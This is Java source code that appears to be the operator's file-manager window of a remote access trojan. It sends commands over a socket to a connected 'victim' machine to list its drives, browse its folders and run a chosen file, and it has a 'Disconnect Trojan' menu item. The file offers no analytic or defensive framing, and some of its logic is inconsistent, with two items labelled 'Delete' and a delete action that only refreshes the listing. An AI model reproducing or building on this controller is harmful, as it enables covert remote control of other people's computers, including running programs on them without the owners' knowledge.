package New;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.IOException;
import java.util.ArrayList;

import javax.swing.*;
import javax.swing.plaf.FontUIResource;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableCellRenderer;
import javax.swing.table.TableColumn;
import javax.swing.table.TableColumnModel;
public class File_Manager_vbs {
	private  JFrame form ;
	private  JTable j; 
	private    JScrollPane sp;
    private  JPopupMenu popupMenu;
    private  JMenuItem menuItem_Run_File;
    private  JMenuItem Refresh_menuitem;
    private  JMenuItem menuItemDesktop;
    private  JMenuItem menuItemRemoveVictim;

	private  String Exe_Split = "fxf0x4x4x0fxf";
	private  String Exe_Ending = "c2x2824x828200x0c";
	private  String Jar_Split = "fxf0x4x4x0fxf";
	private  String Jar_Ending = "c2x2824x828200x0c";
	private  String sock = "";
    private  String title = "";
	private  JTextArea Dir ;
	
	
	
	public File_Manager_vbs(String ip){
		this.sock = ip;
		this.Do_frame();
		this.command();
	}
	public void Set_sock(String ip){
		sock = ip;
	}
	public String Get_sock(){
		return sock ;
	}
	public void command(){
		
		  sock = title.replace("File Manager For : "  , "");
		Master.Send_Data("getalldrives" + Exe_Split + Exe_Ending,sock,false);
		Master.Send_Data("getdrives" + Exe_Split + Exe_Ending,sock,false);
	}
	 class CellRenderer implements TableCellRenderer {
		 
	        @Override
	        public Component getTableCellRendererComponent(JTable table,
	                Object value,
	                boolean isSelected,
	                boolean hasFocus,
	                int row,
	                int column) {
	 
	            TableColumn tb = j.getColumn("Image");
	            tb.setMaxWidth(60);
	            tb.setMinWidth(60);
	 
	            j.setRowHeight(60);
	 
	            return (Component) value;
	        }
	 
	    }
	public void yourAddRow(String str0,String str1, String str2, String str3 ){
		  DefaultTableModel Model = (DefaultTableModel) j.getModel();
			 for(int row = 0;row < Model.getRowCount();row++) {
				  for(int col = 0;col < Model.getColumnCount();col++) {
					 
			 	    	if (Model.getValueAt(row, 1) == str1 || (Model.getValueAt(row, 1)).toString().contains(str1)){
			 	    		return;
			 	    	}
			 	      }
			 	}
			 if(str0 == "#"){
				 //Drive icon
				// CellRenderer CellRenderer = new CellRenderer();
				// j.getColumn("Image").setCellRenderer(CellRenderer);
				 ImageIcon icon=new ImageIcon(Master.class.getResource("Drive.png"));
				 
				  Model.addRow(new Object[]{icon,str1, str2, str3});
			 }else  if(str0 == "$"){
				 //Folder icon
				 ImageIcon icon=new ImageIcon(Master.class.getResource("folder.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3});
			 }else  if(str0 == "@"){
				 //File icon
				 ImageIcon icon=new ImageIcon(Master.class.getResource("file.png"));
				  Model.addRow(new Object[]{icon,str1, str2, str3});
			 }
			 for(int row = 0;row < Model.getRowCount();row++) {
				  for(int col = 0;col < Model.getColumnCount();col++) {
					  j.setRowHeight(row, 25);
					   
			 	      }
			 	}
			 TableColumnModel columnModel = j.getColumnModel();
			  columnModel.getColumn(0).setMaxWidth(25);
			// setColumnWidths(j,0);
		 //IP is 2nd column
		   
		}
	public static void setColumnWidths(JTable table, int... widths) {
	    TableColumnModel columnModel = table.getColumnModel();
	    for (int i = 0; i < widths.length; i++) {
	        if (i < columnModel.getColumnCount()) {
	            columnModel.getColumn(i).setMaxWidth(widths[i]);
	        }
	        else break;
	    }
	}
	 private static  ArrayList<String> SplitString(String s){
		 String Word = "";
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }
	 private  ArrayList<String> SplitString_D(String s,String Delimeter){
		 String Word = "";
		 
		 String YY = Delimeter;
	 ArrayList<String>Words = new ArrayList<String>();
	 if(s.contains(YY)==false){
		 Words.add(s);
		 
		
		 return Words;
			
	 }else{

		 for (int i = 0 ; i<s.length();i++){
			 if ((s.charAt(i) =='|')== false) {
				 Word += s.charAt(i);
			 }else{
				 if(Words.contains(Word)==false){
				 Words.add(Word);
				 
				}
				 Word = "";
			 }
		 }
			 
			 return Words;
			 
	 }
		   
	 }
	 private  String convertSize(float iSize)
	 {
	   if (iSize <= 0.0F) {
	     return "0";
	   }
	   
	   String[] units = { "Bytes", "KB", "MB", "GB", "TB" };
	   int digitGroups = (int)(Math.log10(iSize) / Math.log10(1024.0D));
	   
	   return new java.text.DecimalFormat("#,##0.#")
	     .format(iSize / Math.pow(1024.0D, digitGroups)) + 
	     " " + units[digitGroups];
	 }
	public  void Perform_data(String Received){
		 form.setTitle("File Manager For : " + sock);
		 form.repaint();
		 String YY = "";
		 String xx = "|||";
		 YY = xx.charAt(0)+ "" +xx.charAt(1);
		//  System.out.println("here          " + Received );
			if (Received.isEmpty()==false){
				 
					Received = Received.replace("c2x2824x828200x0c", YY);
					
					  switch (SplitString(Received).get(0)){
					  
					  case "drive":
						  yourAddRow("#",SplitString(Received).get(2),SplitString(Received).get(3) + " Drive","N/A");
							 j.repaint();
							 //sp = new JScrollPane(j); 
						     //sp.setBounds(5, 50, 990, 300); 
						     sp.updateUI();
							 form.repaint();
						  
						  break;
						  
					  case "folderitem":
						 
						  yourAddRow("$",SplitString(Received).get(2),"File Folder","N/A");
						 
							 j.repaint();
							 //sp = new JScrollPane(j); 
						     //sp.setBounds(5, 50, 990, 300); 
						     sp.updateUI();
							 form.repaint();
						  
						  break;
						  
					  case "fileitem":
						  String filesizex = SplitString(Received).get(3);
						String file_type = "N/A";
						  try{
							  file_type = SplitString(Received).get(2).substring(SplitString(Received).get(2).lastIndexOf("."),SplitString(Received).get(2).length());
							 
						  }catch(Exception ex){
							  try{
								  file_type = SplitString(Received).get(2).substring(SplitString(Received).get(2).lastIndexOf("."),SplitString(Received).get(2).length()-1);
								 
							  }catch(Exception exx2){ }
						  }
						  yourAddRow("@",SplitString(Received).get(2),file_type + " File" ,filesizex);
						 
							 j.repaint();
							 //sp = new JScrollPane(j); 
						     //sp.setBounds(5, 50, 990, 300); 
						     sp.updateUI();
							 form.repaint();
						  
						  break;
					  case "flashaya" :
						    System.out.print(SplitString(Received).get(2));
							 yourAddRow("#",SplitString(Received).get(2),SplitString(Received).get(3),SplitString(Received).get(4));
							 j.repaint();
							 //sp = new JScrollPane(j); 
						     //sp.setBounds(5, 50, 990, 300); 
						     sp.updateUI();
							 form.repaint();
						  break;
						  
					  case "filemanager":
						  get_row_index(); //clear jtable
						  String rest_line =  SplitString(Received).get(2);
						  System.out.println(rest_line);
						  String []DDFM =rest_line.split("FileManagerSplitFileManagerSplit");
						  String files_line = "";
						  for (String s:DDFM){
							  if (s.contains("[Folder]")){
								  s = s.replace("[Folder]", "");
								  yourAddRow("$",s,"File Folder","N/A");
							  }else{
								  files_line = s ;
								  break;
							  }
							//  
						  }
						  String []DDFM2 =files_line.split("FileManagerSplit");
						  int counter = 0;
						  int rev = 0;
						  for (int i = 0 ; i < DDFM2.length; i++ ){
							  String item = DDFM2[i];
							  String filename = "";
							  String filesize ="";
							  if (rev ==0 ){
								  filename = DDFM2[i];
								  filesize =  DDFM2[i+1];
								  rev = 1;
							  } else if (rev ==1 ){
								  rev =0;
							  }
							  System.out.println("xxxxxxxxxxx          " + filename );
							  float number = (float) 0.0;
							  try{
								  number = Float.valueOf(filesize);
							  }catch(Exception ex){ }
							
							yourAddRow("@",filename,"File",convertSize(number));
						  }
						  
						 
						  
						
						  j.repaint();
							 //sp = new JScrollPane(j); 
						     //sp.setBounds(5, 50, 990, 300); 
						     sp.updateUI();
							 form.repaint();
						  break;
					  }
					
				 
					
				
			}
				
		
	}
	public  void Do_frame(){
		 form = new JFrame();
		 form.setName("File Manager For : " + sock);
		 form.setTitle("File Manager For : " + sock);
		 title = "File Manager For : " + sock;
		 form.setResizable(false);
		  
		 int widthx =  (int) Toolkit.getDefaultToolkit().getScreenSize().getWidth();
		 int heightx = (int) Toolkit.getDefaultToolkit().getScreenSize().getHeight();
	 
		 form.setBounds((widthx -500)/2,( heightx -430)/2, 500, 430);
		 form.setLayout(null);
		 Font font = new Font("Microsoft Sans Serif", Font.PLAIN, 12);
		 Dir = new JTextArea("");
		 Dir.setBounds(5, 5, 485, 65);
		 
		 JButton btnNext = new JButton("Back");
			btnNext.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent arg0) {
					//do here some stuff
					if(Dir.getText().length()< 4){
						  get_row_index(); //clear jtable
						  Dir.setText("");
						  command();
					}else{
						
						if (Dir.getText().contains("/")){
							int last_index = Dir.getText().lastIndexOf("/");
							 Dir.setText(Dir.getText().substring(0, last_index) );  
							int last_index2 = Dir.getText().lastIndexOf("/")  +1 ;
							 Dir.setText(Dir.getText().substring(0, last_index2) );  
							 //re command exe trojan 
							  Dir.repaint();
							  get_row_index(); //clear jtable
							  sock = title.replace("File Manager For : "  , "");
		                	  Master.Send_Data("FileManager" + Exe_Split  + Dir.getText() + Exe_Split + Exe_Ending , sock,false);

						}else{
							int last_index = Dir.getText().lastIndexOf(("\\").charAt(0));
							 Dir.setText(Dir.getText().substring(0, last_index) );  
							int last_index2 = Dir.getText().lastIndexOf(("\\").charAt(0)) +1 ;
							 Dir.setText(Dir.getText().substring(0, last_index2) );  
							 //re command exe trojan 
							  Dir.repaint();
							  get_row_index(); //clear jtable
							  sock = title.replace("File Manager For : "  , "");
		                	  Master.Send_Data("FileManager" + Exe_Split  + Dir.getText() + Exe_Split + Exe_Ending , sock,false);

						}
							                	  
					}
					
				}
			});
			btnNext.setBounds(5, 75, 70, 23);
			
			DefaultTableModel model = new DefaultTableModel(){

     	         @Override
     	         public boolean isCellEditable(int row, int column) {
     	             //Only the third column
     	             return false;
     	         }
     	    	public Class<?> getColumnClass(int column) {
     	           switch(column) {
     	               
     	               case 0: return ImageIcon.class;
     	               default: return Object.class;
     	           	}
     	   				}
			};

			
			JPopupMenu popupMenu = new JPopupMenu();
		     menuItem_Run_File = new JMenuItem("Run");  
		     Refresh_menuitem = new JMenuItem("Delete");
		     menuItemDesktop = new JMenuItem("Delete");
			menuItemRemoveVictim = new JMenuItem("Disconnect Trojan");
			
			popupMenu.add(menuItem_Run_File);
			popupMenu.add(Refresh_menuitem);
			popupMenu.add(menuItemDesktop);
			popupMenu.add(menuItemRemoveVictim);
			
			ImageIcon icon=new ImageIcon("Drive.png");
		    Object[] columnNames = {"^.^","Drive / File / Folder", "Type / Ext.", "Size"}; 

			// adding it to JScrollPane 
	       /* for (String Col_name : columnNames){
	        	TableColumn Col = new TableColumn();
		        
		        model.addColumn(Col_name);
		        
	        }*/
	        model.setColumnIdentifiers(columnNames);
	      	j = new JTable(model); 
	      	 
	      	
	      	        
	        j.setBounds(5, 100, 485, 290); 
	        j.setComponentPopupMenu(popupMenu);
			 
	        
	        j.addMouseListener(new MouseAdapter() {
	            public void mouseClicked(MouseEvent me) {
	               if (me.getClickCount() == 2) {     // to detect doble click events
	                  JTable target = (JTable)me.getSource();
	                  int row = target.getSelectedRow(); // select a row
	                  int column = target.getSelectedColumn(); // select a column
	                  String selected_Value_double_click =j.getModel().getValueAt(row, 1).toString();
	                  String item_type =j.getModel().getValueAt(row, 2).toString();
	                  
	                  if (item_type.contains("Folder")||item_type.contains("Drive")){
	                 
	                	  
	                		 if(item_type.contains("null D") || Dir.getText().contains("/")){
	                			  Dir.setText(Dir.getText() + selected_Value_double_click + "/");  
			                	  Dir.repaint();
	                		 }else{
	                			  Dir.setText(Dir.getText() + selected_Value_double_click + ("\\").charAt(0) );  
			                	  Dir.repaint();
	                		 }
		                	
		                	 // System.out.print("here enter command : " + Dir.getText());
		                	  get_row_index(); //clear jtable
		                	  System.out.println("iam          " + sock );
		                	  sock = title.replace("File Manager For : "  , "");
		                	 // new MessageBox().infoBox("iam " + sock, "");
		                	  Master.Send_Data("FileManager" + Exe_Split  + Dir.getText() + Exe_Split + Exe_Ending , sock,false);
		                 
	                	  
	                 }
	                  
	                  
	               }
	            }
	         });
	        
	        
	        
	        Refresh_menuitem.addActionListener(new ActionListener() {
	        	
	  				public void actionPerformed(ActionEvent event) {
	  					//do here some stuff
	  				 
	  				 if (JOptionPane.showConfirmDialog(form, 
	 			            "Are you sure you want to Delete Selected Item ?", "Close Window?", 
	 			            JOptionPane.YES_NO_OPTION,
	 			            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
	  					if(Dir.getText().length()< 4){
							  get_row_index(); //clear jtable
							  Dir.setText("");
							  command();
						}else{
							 get_row_index(); //clear jtable
							  sock = title.replace("File Manager For : "  , "");
							  System.out.println("iam          " + sock );
							  Master.Send_Data("FileManager" + Exe_Split  + Dir.getText() + Exe_Split + Exe_Ending , sock,false);
		  		        		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
		  		        		
						}
	 			        }	 
	  				
	  				
	  					
	  		         
	  				}
	  			});
	  			
	        
	        
	        menuItem_Run_File.addActionListener(new ActionListener() {
	        	
				public void actionPerformed(ActionEvent event) {
					//do here some stuff
						int selectedRow = j.getSelectedRow();
						String selected_item = j.getModel().getValueAt(selectedRow, 1).toString();
						  sock = title.replace("File Manager For : "  , "");
						Master.Send_Data("execute"  +  Exe_Split+ Dir.getText() + selected_item    +  Exe_Split + Exe_Ending , sock,false);
		        		//Send_Data("openfm" + Exe_Split + Exe_Ending,selected_sock);
		        		
		         
				}
			});
			
	        btnNext.setFont(font);
			Dir.setFont(font);
			Dir.setEditable(false);
			 
			
			
			
			
		    form.addWindowListener(new java.awt.event.WindowAdapter() {
			    @Override
			    public void windowClosing(java.awt.event.WindowEvent windowEvent) {
			        Master.Remove_Form_FileManager_VB(sock);
			    	 if (JOptionPane.showConfirmDialog(form, 
			            "Are you sure you want to close File Manager "+ sock +" window?", "Close Window?", 
			            JOptionPane.YES_NO_OPTION,
			            JOptionPane.QUESTION_MESSAGE) == JOptionPane.YES_OPTION){
			    
			        } 
			    }
			}); 
			
			
			
			
		   FontUIResource fontx = new FontUIResource("Verdana", Font.PLAIN, 13);
		   UIManager.put("Table.font", fontx);
		   UIManager.put("Table.foreground", Color.RED);
		//	 form.add(btnNext);
			// form.add(Dir);
		        sp = new JScrollPane(j); 
		        j.setFont(fontx);
		        sp.setBounds(5, 100, 485, 290); 
		        form.setLayout(new BorderLayout());
		        JPanel Buttons = new JPanel();
		        Buttons.setSize(50, 50);
		        Buttons.setBackground(Color.DARK_GRAY);
		        Buttons.setLayout(null);
		        Buttons.add(btnNext); Buttons.add(Dir);
		       
				   // spRight.setDividerSize(300);
				   // spRight.setContinuousLayout(true);
				    final JSplitPane split;

				    split = new JSplitPane(JSplitPane.VERTICAL_SPLIT, Buttons,sp );
				   // split.setContinuousLayout(false);
				    split.setDividerSize(10);
				    split.setDividerLocation(120);
				    split.setOneTouchExpandable(true);
				    //form.add(split, BorderLayout.CENTER);
				    form.addComponentListener(new ComponentAdapter() {
				        public void componentResized(ComponentEvent componentEvent) {
				        	split.setDividerLocation(120 );
				        	Dir.setSize(form.getWidth()-10,Dir.getHeight() );
				        	split.validate();
				        	split.repaint();
				        }
				    });
				 //form.add(sp);
			        //form.add(leftSplitPane, BorderLayout.WEST);
			       // form.add(splitPane, BorderLayout.CENTER);
				 form.validate();
				 form.setResizable(true);
				    form.getContentPane().add(split, BorderLayout.CENTER);
		        
		        
		        
		        
		        
		        
			// form.add(sp);
			 form.validate();
			// form.getContentPane().setBackground(Color.DARK_GRAY);
			 form.setVisible(true);
			
	}
	
	
	public void get_row_index(){
		 
		 DefaultTableModel dm = (DefaultTableModel) j.getModel();
		 int rowCount = dm.getRowCount();
		 //Remove rows one by one from the end of the table
		 for (int i = rowCount - 1; i >= 0; i--) {
		     dm.removeRow(i);
		 	j.repaint();
		 }
	}
	
}
